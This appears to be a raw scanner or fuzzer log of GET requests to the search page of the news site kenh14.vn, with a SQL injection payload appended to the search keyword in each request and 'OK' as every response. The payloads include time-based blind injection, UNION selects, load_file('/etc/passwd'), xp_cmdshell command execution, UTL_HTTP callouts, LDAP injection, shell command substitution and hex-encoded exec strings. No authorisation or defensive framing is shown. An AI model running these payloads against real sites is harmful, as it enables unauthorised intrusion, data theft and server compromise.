+[Response]: OK - %20'sleep%2050'
+[Request]: time:170.7567999958992 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaias"} - {"":"undefinedas"} - as
+[Response]: OK - as
+[Request]: time:135.15650004148483 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai1)) or pg_sleep(__TIME__)--"} - {"":"undefined1)) or pg_sleep(__TIME__)--"} - 1)) or pg_sleep(__TIME__)--
+[Response]: OK - 1)) or pg_sleep(__TIME__)--
+[Request]: time:170.32729995250702 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai/**/or/**/1/**/=/**/1"} - {"":"undefined/**/or/**/1/**/=/**/1"} - /**/or/**/1/**/=/**/1
+[Response]: OK - /**/or/**/1/**/=/**/1
+[Request]: time:158.61769998073578 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai union all select @@version--"} - {"":"undefined union all select @@version--"} -  union all select @@version--
+[Response]: OK -  union all select @@version--
+[Request]: time:165.21389997005463 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai,@variable"} - {"":"undefined,@variable"} - ,@variable
+[Response]: OK - ,@variable
+[Request]: time:180.79389995336533 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai(sqlattempt2)"} - {"":"undefined(sqlattempt2)"} - (sqlattempt2)
+[Response]: OK - (sqlattempt2)
+[Request]: time:143.6655000448227 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or (EXISTS)"} - {"":"undefined or (EXISTS)"} -  or (EXISTS)
+[Response]: OK -  or (EXISTS)
+[Request]: time:168.99500000476837 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đait'exec master..xp_cmdshell 'nslookup www.googl ..."} - {"":"undefinedt'exec master..xp_cmdshell 'nslookup www.googl ..."} - t'exec master..xp_cmdshell 'nslookup www.googl ...
+[Response]: OK - t'exec master..xp_cmdshell 'nslookup www.googl ...
+[Request]: time:156.4219000339508 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai%20$(sleep%2050)"} - {"":"undefined%20$(sleep%2050)"} - %20$(sleep%2050)
+[Response]: OK - %20$(sleep%2050)
+[Request]: time:145.16409999132156 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai1 or benchmark(10000000,MD5(1))#"} - {"":"undefined1 or benchmark(10000000,MD5(1))#"} - 1 or benchmark(10000000,MD5(1))#
+[Response]: OK - 1 or benchmark(10000000,MD5(1))#
+[Request]: time:140.68779999017715 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai%20or%20''='"} - {"":"undefined%20or%20''='"} - %20or%20''='
+[Response]: OK - %20or%20''='
+[Request]: time:126.74469995498657 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai||UTL_HTTP.REQUEST"} - {"":"undefined||UTL_HTTP.REQUEST"} - ||UTL_HTTP.REQUEST
+[Response]: OK - ||UTL_HTTP.REQUEST
+[Request]: time:173.17419999837875 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or pg_sleep(__TIME__)--"} - {"":"undefined or pg_sleep(__TIME__)--"} -  or pg_sleep(__TIME__)--
+[Response]: OK -  or pg_sleep(__TIME__)--
+[Request]: time:146.36959999799728 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaihi' or 'x'='x';"} - {"":"undefinedhi' or 'x'='x';"} - hi' or 'x'='x';
+[Response]: OK - hi' or 'x'='x';
+[Request]: time:139.39330005645752 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai) or sleep(__TIME__)="} - {"":"undefined) or sleep(__TIME__)="} - ) or sleep(__TIME__)=
+[Response]: OK - ) or sleep(__TIME__)=
+[Request]: time:143.63249999284744 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 'whatever' in ('whatever')"} - {"":"undefined or 'whatever' in ('whatever')"} -  or 'whatever' in ('whatever')
+[Response]: OK -  or 'whatever' in ('whatever')
+[Request]: time:218.88349997997284 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai; begin declare @var varchar(8000) set @var=' ..."} - {"":"undefined; begin declare @var varchar(8000) set @var=' ..."} - ; begin declare @var varchar(8000) set @var=' ...
+[Response]: OK - ; begin declare @var varchar(8000) set @var=' ...
+[Request]: time:150.26529997587204 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai union select 1,load_file('/etc/passwd'),1,1,1;"} - {"":"undefined union select 1,load_file('/etc/passwd'),1,1,1;"} -  union select 1,load_file('/etc/passwd'),1,1,1;
+[Response]: OK -  union select 1,load_file('/etc/passwd'),1,1,1;
+[Request]: time:140.81170004606247 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai0x77616974666F722064656C61792027303A303A313027 ..."} - {"":"undefined0x77616974666F722064656C61792027303A303A313027 ..."} - 0x77616974666F722064656C61792027303A303A313027 ...
+[Response]: OK - 0x77616974666F722064656C61792027303A303A313027 ...
+[Request]: time:158.33530002832413 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaiexec(@s)"} - {"":"undefinedexec(@s)"} - exec(@s)
+[Response]: OK - exec(@s)
+[Request]: time:165.2936999797821 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai) or pg_sleep(__TIME__)--"} - {"":"undefined) or pg_sleep(__TIME__)--"} - ) or pg_sleep(__TIME__)--
+[Response]: OK - ) or pg_sleep(__TIME__)--
+[Request]: time:136.07879996299744 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai union select"} - {"":"undefined union select"} -  union select
+[Response]: OK -  union select
+[Request]: time:155.94380003213882 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or sleep(__TIME__)#"} - {"":"undefined or sleep(__TIME__)#"} -  or sleep(__TIME__)#
+[Response]: OK -  or sleep(__TIME__)#
+[Request]: time:165.48780000209808 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai select * from information_schema.tables--"} - {"":"undefined select * from information_schema.tables--"} -  select * from information_schema.tables--
+[Response]: OK -  select * from information_schema.tables--
+[Request]: time:176.36510002613068 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaia' or 1=1--"} - {"":"undefineda' or 1=1--"} - a' or 1=1--
+[Response]: OK - a' or 1=1--
+[Request]: time:135.8643999695778 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaia' or 'a' = 'a"} - {"":"undefineda' or 'a' = 'a"} - a' or 'a' = 'a
+[Response]: OK - a' or 'a' = 'a
+[Request]: time:174.55040001869202 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaideclare @s varchar(22) select @s ="} - {"":"undefineddeclare @s varchar(22) select @s ="} - declare @s varchar(22) select @s =
+[Response]: OK - declare @s varchar(22) select @s =
+[Request]: time:374.36320000886917 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 2 between 1 and 3"} - {"":"undefined or 2 between 1 and 3"} -  or 2 between 1 and 3
+[Response]: OK -  or 2 between 1 and 3
+[Request]: time:144.18480002880096 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or a=a--"} - {"":"undefined or a=a--"} -  or a=a--
+[Response]: OK -  or a=a--
+[Request]: time:122.44069999456406 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or '1'='1"} - {"":"undefined or '1'='1"} -  or '1'='1
+[Response]: OK -  or '1'='1
+[Request]: time:146.31319999694824 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai|"} - {"":"undefined|"} - |
+[Response]: OK - |
+[Request]: time:157.69669997692108 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or sleep(__TIME__)='"} - {"":"undefined or sleep(__TIME__)='"} -  or sleep(__TIME__)='
+[Response]: OK -  or sleep(__TIME__)='
+[Request]: time:141.70660001039505 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 1 --'"} - {"":"undefined or 1 --'"} -  or 1 --'
+[Response]: OK -  or 1 --'
+[Request]: time:235.5052000284195 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaior 0=0 #\""} - {"":"undefinedor 0=0 #\""} - or 0=0 #"
+[Response]: OK - or 0=0 #"
+[Request]: time:190.7606999874115 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaihaving"} - {"":"undefinedhaving"} - having
+[Response]: OK - having
+[Request]: time:170.56450003385544 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaia'"} - {"":"undefineda'"} - a'
+[Response]: OK - a'
+[Request]: time:395.33509999513626 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai\" or isNULL(1/0) /*"} - {"":"undefined\" or isNULL(1/0) /*"} - " or isNULL(1/0) /*
+[Response]: OK - " or isNULL(1/0) /*
+[Request]: time:131.2107999920845 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaideclare @s varchar (8000) select @s = 0x73656c ..."} - {"":"undefineddeclare @s varchar (8000) select @s = 0x73656c ..."} - declare @s varchar (8000) select @s = 0x73656c ...
+[Response]: OK - declare @s varchar (8000) select @s = 0x73656c ...
+[Request]: time:143.0275999903679 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaiâ or 1=1 --"} - {"":"undefinedâ or 1=1 --"} - â or 1=1 --
+[Response]: OK - â or 1=1 --
+[Request]: time:155.6628999710083 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaichar%4039%41%2b%40SELECT"} - {"":"undefinedchar%4039%41%2b%40SELECT"} - char%4039%41%2b%40SELECT
+[Response]: OK - char%4039%41%2b%40SELECT
+[Request]: time:130.8691000342369 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaiorder by"} - {"":"undefinedorder by"} - order by
+[Response]: OK - order by
+[Request]: time:184.64239996671677 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaibfilename"} - {"":"undefinedbfilename"} - bfilename
+[Response]: OK - bfilename
+[Request]: time:167.11920005083084 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai having 1=1--"} - {"":"undefined having 1=1--"} -  having 1=1--
+[Response]: OK -  having 1=1--
+[Request]: time:158.27849996089935 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai) or benchmark(10000000,MD5(1))#"} - {"":"undefined) or benchmark(10000000,MD5(1))#"} - ) or benchmark(10000000,MD5(1))#
+[Response]: OK - ) or benchmark(10000000,MD5(1))#
+[Request]: time:161.4699000120163 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or username like char(37);"} - {"":"undefined or username like char(37);"} -  or username like char(37);
+[Response]: OK -  or username like char(37);
+[Request]: time:132.8507000207901 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai;waitfor delay '0:0:__TIME__'--"} - {"":"undefined;waitfor delay '0:0:__TIME__'--"} - ;waitfor delay '0:0:__TIME__'--
+[Response]: OK - ;waitfor delay '0:0:__TIME__'--
+[Request]: time:146.09140002727509 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 1=1--\""} - {"":"undefined or 1=1--\""} -  or 1=1--"
+[Response]: OK -  or 1=1--"
+[Request]: time:139.2791999578476 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaix' AND userid IS NULL; --"} - {"":"undefinedx' AND userid IS NULL; --"} - x' AND userid IS NULL; --
+[Response]: OK - x' AND userid IS NULL; --
+[Request]: time:158.22330003976822 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai*/*"} - {"":"undefined*/*"} - */*
+[Response]: OK - */*
+[Request]: time:146.53650003671646 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 'text' > 't'"} - {"":"undefined or 'text' > 't'"} -  or 'text' > 't'
+[Response]: OK -  or 'text' > 't'
+[Request]: time:206.49250000715256 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai (select top 1"} - {"":"undefined (select top 1"} -  (select top 1
+[Response]: OK -  (select top 1
+[Request]: time:149.39590001106262 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or benchmark(10000000,MD5(1))#"} - {"":"undefined or benchmark(10000000,MD5(1))#"} -  or benchmark(10000000,MD5(1))#
+[Response]: OK -  or benchmark(10000000,MD5(1))#
+[Request]: time:173.18930000066757 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai\");waitfor delay '0:0:__TIME__'--"} - {"":"undefined\");waitfor delay '0:0:__TIME__'--"} - ");waitfor delay '0:0:__TIME__'--
+[Response]: OK - ");waitfor delay '0:0:__TIME__'--
+[Request]: time:160.35570001602173 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaia' or 3=3--"} - {"":"undefineda' or 3=3--"} - a' or 3=3--
+[Response]: OK - a' or 3=3--
+[Request]: time:173.67960000038147 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai -- &password="} - {"":"undefined -- &password="} -  -- &password=
+[Response]: OK -  -- &password=
+[Request]: time:146.57489997148514 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai group by userid having 1=1--"} - {"":"undefined group by userid having 1=1--"} -  group by userid having 1=1--
+[Response]: OK -  group by userid having 1=1--
+[Request]: time:122.31779998540878 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or ''='"} - {"":"undefined or ''='"} -  or ''='
+[Response]: OK -  or ''='
+[Request]: time:155.4171000123024 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai; exec master..xp_cmdshell"} - {"":"undefined; exec master..xp_cmdshell"} - ; exec master..xp_cmdshell
+[Response]: OK - ; exec master..xp_cmdshell
+[Request]: time:126.8967000246048 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai%20or%20x=x"} - {"":"undefined%20or%20x=x"} - %20or%20x=x
+[Response]: OK - %20or%20x=x
+[Request]: time:630.1136000156403 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaiselect"} - {"":"undefinedselect"} - select
+[Response]: OK - select
+[Request]: time:175.0708999633789 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai)) or sleep(__TIME__)=\"\"\""} - {"":"undefined)) or sleep(__TIME__)=\"\"\""} - )) or sleep(__TIME__)="""
+[Response]: OK - )) or sleep(__TIME__)="""
+[Request]: time:144.50479996204376 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai0x730065006c0065006300740020004000400076006500 ..."} - {"":"undefined0x730065006c0065006300740020004000400076006500 ..."} - 0x730065006c0065006300740020004000400076006500 ...
+[Response]: OK - 0x730065006c0065006300740020004000400076006500 ...
+[Request]: time:181.09340000152588 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaihi' or 1=1 --"} - {"":"undefinedhi' or 1=1 --"} - hi' or 1=1 --
+[Response]: OK - hi' or 1=1 --
+[Request]: time:155.87479996681213 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai\") or pg_sleep(__TIME__)--"} - {"":"undefined\") or pg_sleep(__TIME__)--"} - ") or pg_sleep(__TIME__)--
+[Response]: OK - ") or pg_sleep(__TIME__)--
+[Request]: time:223.92919999361038 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai%20or%20'x'='x"} - {"":"undefined%20or%20'x'='x"} - %20or%20'x'='x
+[Response]: OK - %20or%20'x'='x
+[Request]: time:157.34759998321533 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 'something' = 'some'+'thing'"} - {"":"undefined or 'something' = 'some'+'thing'"} -  or 'something' = 'some'+'thing'
+[Response]: OK -  or 'something' = 'some'+'thing'
+[Request]: time:145.75370001792908 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaiexec sp"} - {"":"undefinedexec sp"} - exec sp
+[Response]: OK - exec sp
+[Request]: time:148.67039996385574 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai29 %"} - {"":"undefined29 %"} - 29 %
+[Response]: OK - 29 %
+[Request]: time:388.91730004549026 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai("} - {"":"undefined("} - (
+[Response]: OK - (
+[Request]: time:241.65599995851517 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaiÃ½ or 1=1 --"} - {"":"undefinedÃ½ or 1=1 --"} - Ã½ or 1=1 --
+[Response]: OK - Ã½ or 1=1 --
+[Request]: time:145.15520000457764 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai1 or pg_sleep(__TIME__)--"} - {"":"undefined1 or pg_sleep(__TIME__)--"} - 1 or pg_sleep(__TIME__)--
+[Response]: OK - 1 or pg_sleep(__TIME__)--
+[Request]: time:146.90169996023178 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai0 or 1=1"} - {"":"undefined0 or 1=1"} - 0 or 1=1
+[Response]: OK - 0 or 1=1
+[Request]: time:140.45910000801086 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai) or (a=a"} - {"":"undefined) or (a=a"} - ) or (a=a
+[Response]: OK - ) or (a=a
+[Request]: time:245.69569998979568 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaiuni/**/on sel/**/ect"} - {"":"undefineduni/**/on sel/**/ect"} - uni/**/on sel/**/ect
+[Response]: OK - uni/**/on sel/**/ect
+[Request]: time:124.75270003080368 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaireplace"} - {"":"undefinedreplace"} - replace
+[Response]: OK - replace
+[Request]: time:728.1238000392914 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai%27%20or%201=1"} - {"":"undefined%27%20or%201=1"} - %27%20or%201=1
+[Response]: OK - %27%20or%201=1
+[Request]: time:165.9722000360489 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai)) or pg_sleep(__TIME__)--"} - {"":"undefined)) or pg_sleep(__TIME__)--"} - )) or pg_sleep(__TIME__)--
+[Response]: OK - )) or pg_sleep(__TIME__)--
+[Request]: time:175.42599999904633 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai%7C"} - {"":"undefined%7C"} - %7C
+[Response]: OK - %7C
+[Request]: time:121.91909998655319 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaix' AND 1=(SELECT COUNT(*) FROM tabname); --"} - {"":"undefinedx' AND 1=(SELECT COUNT(*) FROM tabname); --"} - x' AND 1=(SELECT COUNT(*) FROM tabname); --
+[Response]: OK - x' AND 1=(SELECT COUNT(*) FROM tabname); --
+[Request]: time:140.93529999256134 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai&apos;%20OR"} - {"":"undefined&apos;%20OR"} - &apos;%20OR
+[Response]: OK - &apos;%20OR
+[Request]: time:758.0762000083923 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai; or '1'='1'"} - {"":"undefined; or '1'='1'"} - ; or '1'='1'
+[Response]: OK - ; or '1'='1'
+[Request]: time:119.97869998216629 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaideclare @q nvarchar (200) select @q = 0x770061 ..."} - {"":"undefineddeclare @q nvarchar (200) select @q = 0x770061 ..."} - declare @q nvarchar (200) select @q = 0x770061 ...
+[Response]: OK - declare @q nvarchar (200) select @q = 0x770061 ...
+[Request]: time:156.42809998989105 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai1 or 1=1"} - {"":"undefined1 or 1=1"} - 1 or 1=1
+[Response]: OK - 1 or 1=1
+[Request]: time:250.762600004673 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai; exec ('sel' + 'ect us' + 'er')"} - {"":"undefined; exec ('sel' + 'ect us' + 'er')"} - ; exec ('sel' + 'ect us' + 'er')
+[Response]: OK - ; exec ('sel' + 'ect us' + 'er')
+[Request]: time:119.00639998912811 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai23 OR 1=1"} - {"":"undefined23 OR 1=1"} - 23 OR 1=1
+[Response]: OK - 23 OR 1=1
+[Request]: time:114.17019999027252 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai/"} - {"":"undefined/"} - /
+[Response]: OK - /
+[Request]: time:139.2808000445366 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaianything' OR 'x'='x"} - {"":"undefinedanything' OR 'x'='x"} - anything' OR 'x'='x
+[Response]: OK - anything' OR 'x'='x
+[Request]: time:166.26440000534058 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaideclare @q nvarchar (4000) select @q ="} - {"":"undefineddeclare @q nvarchar (4000) select @q ="} - declare @q nvarchar (4000) select @q =
+[Response]: OK - declare @q nvarchar (4000) select @q =
+[Request]: time:235.17360001802444 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaior 0=0 --"} - {"":"undefinedor 0=0 --"} - or 0=0 --
+[Response]: OK - or 0=0 --
+[Request]: time:129.64519995450974 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaidesc"} - {"":"undefineddesc"} - desc
+[Response]: OK - desc
+[Request]: time:298.9235000014305 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai||'6"} - {"":"undefined||'6"} - ||'6
+[Response]: OK - ||'6
+[Request]: time:183.0512000322342 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai)"} - {"":"undefined)"} - )
+[Response]: OK - )
+[Request]: time:140.53389996290207 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai1)) or sleep(__TIME__)#"} - {"":"undefined1)) or sleep(__TIME__)#"} - 1)) or sleep(__TIME__)#
+[Response]: OK - 1)) or sleep(__TIME__)#
+[Request]: time:385.42719995975494 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaior 0=0 #"} - {"":"undefinedor 0=0 #"} - or 0=0 #
+[Response]: OK - or 0=0 #
+[Request]: time:339.1574999690056 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai select name from syscolumns where id = (sele ..."} - {"":"undefined select name from syscolumns where id = (sele ..."} -  select name from syscolumns where id = (sele ...
+[Response]: OK -  select name from syscolumns where id = (sele ...
+[Request]: time:292.15380001068115 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaihi or a=a"} - {"":"undefinedhi or a=a"} - hi or a=a
+[Response]: OK - hi or a=a
+[Request]: time:307.2102999687195 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai*(|(mail=*))"} - {"":"undefined*(|(mail=*))"} - *(|(mail=*))
+[Response]: OK - *(|(mail=*))
+[Request]: time:342.57039999961853 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaipassword:*/=1--"} - {"":"undefinedpassword:*/=1--"} - password:*/=1--
+[Response]: OK - password:*/=1--
+[Request]: time:138.67500001192093 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaidistinct"} - {"":"undefineddistinct"} - distinct
+[Response]: OK - distinct
+[Request]: time:139.37999999523163 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai);waitfor delay '0:0:__TIME__'--"} - {"":"undefined);waitfor delay '0:0:__TIME__'--"} - );waitfor delay '0:0:__TIME__'--
+[Response]: OK - );waitfor delay '0:0:__TIME__'--
+[Request]: time:138.7820999622345 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaito_timestamp_tz"} - {"":"undefinedto_timestamp_tz"} - to_timestamp_tz
+[Response]: OK - to_timestamp_tz
+[Request]: time:214.38330000638962 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai) or benchmark(10000000,MD5(1))#\""} - {"":"undefined) or benchmark(10000000,MD5(1))#\""} - ) or benchmark(10000000,MD5(1))#"
+[Response]: OK - ) or benchmark(10000000,MD5(1))#"
+[Request]: time:175.43119996786118 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai%2A%28%7C%28mail%3D%2A%29%29"} - {"":"undefined%2A%28%7C%28mail%3D%2A%29%29"} - %2A%28%7C%28mail%3D%2A%29%29
+[Response]: OK - %2A%28%7C%28mail%3D%2A%29%29
+[Request]: time:184.84810000658035 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai#NAME?"} - {"":"undefined#NAME?"} - #NAME?
+[Response]: OK - #NAME?
+[Request]: time:224.98160004615784 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 1=1 /*"} - {"":"undefined or 1=1 /*"} -  or 1=1 /*
+[Response]: OK -  or 1=1 /*
+[Request]: time:244.09239995479584 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai)) or sleep(__TIME__)='"} - {"":"undefined)) or sleep(__TIME__)='"} - )) or sleep(__TIME__)='
+[Response]: OK - )) or sleep(__TIME__)='
+[Request]: time:139.85780000686646 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaior 1=1 or \"\"="} - {"":"undefinedor 1=1 or \"\"="} - or 1=1 or ""=
+[Response]: OK - or 1=1 or ""=
+[Request]: time:175.23139995336533 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 1 in (select @@version)--"} - {"":"undefined or 1 in (select @@version)--"} -  or 1 in (select @@version)--
+[Response]: OK -  or 1 in (select @@version)--
+[Request]: time:141.73040002584457 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaisqlvuln;"} - {"":"undefinedsqlvuln;"} - sqlvuln;
+[Response]: OK - sqlvuln;
+[Request]: time:147.18330001831055 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai union select * from users where login = char ..."} - {"":"undefined union select * from users where login = char ..."} -  union select * from users where login = char ...
+[Response]: OK -  union select * from users where login = char ...
+[Request]: time:169.4666000008583 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaix' or 1=1 or 'x'='y"} - {"":"undefinedx' or 1=1 or 'x'='y"} - x' or 1=1 or 'x'='y
+[Response]: OK - x' or 1=1 or 'x'='y
+[Request]: time:135.98780000209808 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai28%"} - {"":"undefined28%"} - 28%
+[Response]: OK - 28%
+[Request]: time:161.07920002937317 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaiâ or 3=3 --"} - {"":"undefinedâ or 3=3 --"} - â or 3=3 --
+[Response]: OK - â or 3=3 --
+[Request]: time:142.86699998378754 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai@variable"} - {"":"undefined@variable"} - @variable
+[Response]: OK - @variable
+[Request]: time:145.47360002994537 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or '1'='1'--"} - {"":"undefined or '1'='1'--"} -  or '1'='1'--
+[Response]: OK -  or '1'='1'--
+[Request]: time:177.19160002470016 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaia\" or 1=1--"} - {"":"undefineda\" or 1=1--"} - a" or 1=1--
+[Response]: OK - a" or 1=1--
+[Request]: time:134.56360000371933 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai//*"} - {"":"undefined//*"} - //*
+[Response]: OK - //*
+[Request]: time:145.69949996471405 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai%2A%7C"} - {"":"undefined%2A%7C"} - %2A%7C
+[Response]: OK - %2A%7C
+[Request]: time:148.83310002088547 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai\" or 0=0 --"} - {"":"undefined\" or 0=0 --"} - " or 0=0 --
+[Response]: OK - " or 0=0 --
+[Request]: time:177.7858999967575 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai)) or pg_sleep(__TIME__)--\""} - {"":"undefined)) or pg_sleep(__TIME__)--\""} - )) or pg_sleep(__TIME__)--"
+[Response]: OK - )) or pg_sleep(__TIME__)--"
+[Request]: time:155.0518999695778 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai?"} - {"":"undefined?"} - ?
+[Response]: OK - ?
+[Request]: time:168.84219998121262 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or 1/*"} - {"":"undefined or 1/*"} -  or 1/*
+[Response]: OK -  or 1/*
+[Request]: time:146.62550002336502 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai!"} - {"":"undefined!"} - !
+[Response]: OK - !
+[Request]: time:146.99470001459122 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai'"} - {"":"undefined'"} - '
+[Response]: OK - '
+[Request]: time:207.09079998731613 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đai or a = a"} - {"":"undefined or a = a"} -  or a = a
+[Response]: OK -  or a = a
+[Request]: time:163.54549998044968 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaideclare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)"} - {"":"undefineddeclare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)"} - declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+[Response]: OK - declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+[Request]: time:240.3813999891281 - https://kenh14.vn/tim-kiem.chn - get - {"keyword":" đất đaideclare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) "} - {"":"undefineddeclare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) "} - declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) 
